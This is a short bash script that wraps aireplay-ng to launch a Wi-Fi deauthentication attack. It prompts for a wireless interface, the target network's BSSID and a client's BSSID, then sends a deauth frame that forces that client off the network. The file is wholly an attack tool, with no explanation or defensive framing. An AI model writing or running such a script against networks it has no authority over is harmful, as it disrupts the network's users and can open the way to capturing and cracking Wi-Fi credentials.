#!/bin/bash

clear
iwconfig
read -r -p "Enter the interface to use for the de-auth: " interface
read -r -p "Enter the BSSID of the network: " bssid
read -r -p "Enter the BSSID of the client: " client_bssid

aireplay-ng -0 1 -a $bssid -c $client_bssid $interface
